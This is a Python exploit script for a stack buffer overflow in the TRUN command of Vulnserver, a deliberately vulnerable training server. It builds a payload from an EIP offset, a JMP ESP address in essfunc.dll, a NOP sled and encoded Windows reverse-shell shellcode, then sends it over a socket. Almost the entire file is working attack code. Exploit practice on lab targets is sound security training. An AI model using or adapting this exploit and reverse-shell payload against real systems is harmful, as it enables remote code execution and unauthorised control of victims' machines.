#!/usr/bin/python3


### STACK-BASED BUFFER OVERFLOW EXPLOIT IN TRUN - VULNSERVER ###
### CODE MADE BY: sp1derm0rph3us ###

### OVERFLOW AT 2101 BYTES ###
### EIP OFFSET: 2003 ###
### SHELLSPACE: 480 BYTES ###
### JMP ESP: 0x625011AF in essfunc.dll ###

import socket
import time
import sys
import struct

# Create connection
def sock_conn(t, p):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.connect((t, p))
        return s

    except socket.error as e:
        print(f"[-] Unable to connect to target: {e}")
        return None

# Exploit
def main():
    if len(sys.argv) != 3:
        print("Usage: ./exploit.py [mode] [target] [port]")

    else:
        target = str(sys.argv[1])
        p = int(sys.argv[2])
        eip_offset = b"A"*2003
        jmp_esp = struct.pack("<I", 0x625011AF)
        nop = b'\x90'*32
        buf =  b"" # windows/shell_reverse_tcp -e x86/shikata_ga_nai -i 3 | ~407 bytes
        buf += b"\xdb\xcb\xd9\x74\x24\xf4\x5a\x29\xc9\xb1\x5f\xbe"
        buf += b"\xf2\x2f\xc2\xb4\x83\xc2\x04\x31\x72\x15\x03\x72"
        buf += b"\x15\x10\xda\x7a\x7b\xc1\x26\xb7\x5e\x29\xf1\x33"
        buf += b"\x7b\x5d\x5d\x95\x4a\x2c\x3a\x66\xa3\xb2\x8a\x2f"
        buf += b"\x2d\x49\xaa\xbe\xaf\x77\x9b\x3e\xe9\x57\x6c\xe6"
        buf += b"\xc8\x56\x28\x1a\x7f\xb7\x43\xd0\x82\x1a\x11\x31"
        buf += b"\x1a\xf4\xae\xfa\x7d\xcc\x13\xc9\xb2\xbe\x09\xff"
        buf += b"\x09\x1a\x2e\xc8\x28\xf1\xc2\x69\xb0\xae\x53\x5c"
        buf += b"\x75\x27\x2c\x17\x22\x44\x97\xc2\xbb\xea\x58\xec"
        buf += b"\x3a\x5e\x32\xaf\xd6\x23\x5f\xd1\x7d\x03\x8f\xa5"
        buf += b"\x0e\xf5\x77\xbd\x9e\xcb\xbf\x45\x65\x39\x5e\x05"
        buf += b"\x69\x9c\x4b\x74\x52\xcb\xe8\x21\xe0\x41\xe8\x89"
        buf += b"\xee\x9f\x15\x70\x71\x8d\x69\x51\x41\xc8\x76\x8c"
        buf += b"\xce\xaa\x66\xbd\x72\x90\x6b\x3b\xbd\xdb\x86\xa9"
        buf += b"\xe8\xe3\xb7\xb5\xf4\x19\x37\x74\x0a\x01\xef\x7b"
        buf += b"\xba\x63\xaf\x82\xa5\x40\x46\x3a\x0f\x10\x8b\x3a"
        buf += b"\x1c\x0a\x45\x09\xc4\xf4\xfd\x31\xf0\xda\x6c\xa9"
        buf += b"\xa5\xcd\xab\x6b\x93\xcb\x03\x41\xa5\x39\x92\xe7"
        buf += b"\x54\x92\x7d\x7c\x16\xe6\x67\xca\xfa\xd4\x9d\xf7"
        buf += b"\x12\x02\x87\xb9\x50\x0f\x0d\x3c\xf5\x19\x7a\x59"
        buf += b"\xf9\x83\x0a\xe7\xce\xd5\xc7\xf2\x24\xbf\x92\xe9"
        buf += b"\x82\xc1\x36\x6c\x71\x8b\x44\x17\xc6\x37\xf5\xf0"
        buf += b"\x74\xd2\xc2\x0d\x5b\x3d\xe0\x12\x76\xad\x43\x30"
        buf += b"\xda\x8a\xae\x7b\x2d\x10\x3d\xc0\xa6\x0e\x90\xbf"
        buf += b"\xf9\xde\x68\x07\xfc\x71\xfd\x75\xed\x66\x9e\xab"
        buf += b"\x01\xfd\x59\xb6\x6a\xb0\xdc\x7f\x8d\x87\x86\x53"
        buf += b"\x0a\x4a\xcf\xf9\x38\xee\x1e\x64\xcf\xa7\xf7\x69"
        buf += b"\xac\xb5\xc5\x66\x70\xaa\xe1\x64\x05\x61\xa9\x5a"
        buf += b"\xfc\x40\xa1\x1c\x0e\xd7\xd8\xba\x04\x08\xe9\x0b"
        buf += b"\xa8\x4d\xb5\x0a\x62\xd2\x99\xd7\x43\x01\x88\x83"
        buf += b"\xcd\x66\x1a\xbb\xb1\xbe\xb6\x4c\x78\xf4\xc5\x6f"
        buf += b"\x73\xeb\x44\x82\x23\x83\xf1\xed\x35\x93\xde\x7a"
        buf += b"\xaa\x6a\x16\x3c\xdf\x42\x30\x4d\xf7\xb0\x4a\xa2"
        buf += b"\x41\x99\x9c\x70\x83\x17\x5c\x93\xb1"
        shellcode = buf


        try:
            print(f"[*] Establishing connection with {target}:{p}\r")
            time.sleep(1)
            s = sock_conn(target, p)
            if s:
                print("[+] Connection established. Capturing banner...\r\n")
                banner = s.recv(1024).decode('UTF-8').strip()
                print(banner)
                time.sleep(1)
                print(f"[*] Exploiting...\r")
                time.sleep(1)
                try:
                    s.send(b"TRUN /.:/" + eip_offset + jmp_esp + nop + shellcode + b"\r\n")
                    print("[+] Exploit executed successfuly!\r\n")

                except socket.error as e:
                    print(f"[-] Exploit failed: {e}\r\n")

            else:
                print(f"[-] Failed trying establish connection with {target}:{p}")
            

        except Exception as e:
            print(f"[-] Unable to exploit target: {e}")
            return 1

        finally:
            if s:
                print("[*] Closing connection...")
                time.sleep(0.5)
                s.close()
                print("[+] Obliterating your privacy, as usual :)\r\n")

if __name__ == "__main__":
    main()
